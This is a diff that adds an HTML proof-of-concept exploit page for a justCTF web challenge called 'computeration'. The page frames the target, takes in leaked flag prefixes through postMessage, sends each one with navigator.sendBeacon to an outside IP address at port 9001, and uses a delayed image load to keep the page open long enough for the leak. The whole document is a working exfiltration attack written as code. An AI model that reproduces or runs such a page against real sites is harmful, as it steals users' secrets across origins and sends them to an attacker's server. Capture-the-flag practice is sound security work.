@@ -1,0 +1,24 @@
+
+<!-- Don't switch tabs, this breaks the exploit!! -->
+
+<iframe src="computeration.html" style="width:90vw;height:30vh"></iframe>
+
+<p><i>In order for the poc to be yielding any interesting results, you need to add a note with some content, e.g. <code>justCTF{something_here}</code>. <!-- Or you can add it easily by clicking this <a href="https://computeration.web.jctf.pro/b811667a5a09db734093a974111d750e?url=//example.org" target="_blank">link</a>. (the page needs to be reloaded after) --></i></p>
+
+
+<code><pre id="log"></pre></code>
+
+<script>
+const fetch_server = 'http://140.113.24.143:9001'
+navigator.sendBeacon(fetch_server,'start');
+onmessage = e => {
+    log.innerHTML += `Found the prefix of the flag: ${e.data} \n`;
+    navigator.sendBeacon(fetch_server, 'flag='+e.data);
+}
+</script>
+
+
+<!-- Extended page load by 10 seconds -->
+<img src="https://deelay.me/10000/http://example.com"/>
+
+
